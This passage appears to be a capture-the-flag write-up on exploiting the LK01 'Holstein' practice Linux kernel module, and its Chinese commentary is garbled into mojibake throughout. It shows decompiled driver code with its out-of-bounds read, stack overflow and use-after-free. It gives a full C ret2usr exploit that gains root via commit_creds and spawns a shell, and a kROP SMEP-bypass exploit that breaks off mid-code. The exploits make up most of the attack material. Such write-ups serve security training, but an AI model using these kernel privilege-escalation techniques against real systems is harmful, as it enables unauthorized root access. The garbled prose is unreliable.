class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡ ä¹æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤<br>åŠ ä¸Š-sï¼Œæ–¹ä¾¿è°ƒè¯•</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>å¼€äº†NX</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/xinri/LK01/qemu/rootfs/root/vuln.ko'</span>    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><p>åœ¨&#x2F;devä¸‹æ³¨å†Œäº†ä¸€ä¸ªåä¸º holstein çš„è®¾å¤‡</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_44E<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_960 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_46B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3AA<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span><span class="token number">0x400LL</span><span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3C0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†é…äº†ä¸€ä¸ª0x400çš„å†…å­˜å—</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v5<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-400h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x3F8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3D1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>g_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3E7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_to_user(bufï¼Œg_bufï¼Œsize)ï¼Œå¯ä»¥kbufè¶Šç•Œè¯»</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-400h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_3FE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_415<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>g_buf <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1016</span><span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">127</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">qmemcpy</span><span class="token punctuation">(</span>      <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">-</span> <span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v4 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFF8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFF8</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_from_user(kbufï¼Œbufï¼Œsize)ï¼Œæ ˆæº¢å‡º</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_42E<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment">// å­˜åœ¨UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒ-EXP"><a href="#äºŒ-EXP" class="headerlink" title="(äºŒ)EXP"></a>(äºŒ)EXP</h2><p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡º</p><p>æ‰“ä¸€ä¸ªret2usr</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> ropchain<span class="token punctuation">[</span><span class="token number">0x410</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootPrivilige<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/34635a4f3364dca9e7d315f301dfc8e3_MD5.jpeg"></p><h1 id="äºŒã€LK01-Holstein-v1-smep"><a href="#äºŒã€LK01-Holstein-v1-smep" class="headerlink" title="äºŒã€LK01 Holstein v1 +smep"></a>äºŒã€LK01 Holstein v1 +smep</h1><p>æ— æ³•ä½¿ç”¨ret2usrï¼Œè¿™é‡Œä½¿ç”¨kROPæ¥ç»•è¿‡smep</p><p>é€‰æ‹©çš„gadgetæ˜¯<code>0xffffffff8160c96b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;</code></p><p>è¿™é‡Œå¡ä½çš„ä¸€ç‚¹æ˜¯ï¼Œæ±‡ç¼–æŒ‡ä»¤repã€‚å®ƒæ˜¯ä¸€ä¸ªæ±‡ç¼–è¯­è¨€çš„æŒ‡ä»¤å‰ç¼€ï¼Œè¡¨ç¤ºé‡å¤æ‰§è¡Œåé¢çš„æŒ‡ä»¤ï¼ŒrepæŒ‡ä»¤å¯ä»¥é€šè¿‡è®¾ç½®è®¡æ•°å™¨æ¥æ§åˆ¶é‡å¤æ¬¡æ•°ï¼Œè®¡æ•°å™¨çš„å€¼å­˜æ”¾åœ¨<code>ecx</code>å¯„å­˜å™¨ä¸­ï¼Œç›´åˆ°ä¸º0åœæ­¢ã€‚å› æ­¤éœ€è¦gadget <code>POP_RCX_RET</code>æ¥èµ‹å€¼ä¸º0ä¸­æ­¢å¾ªç¯</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span 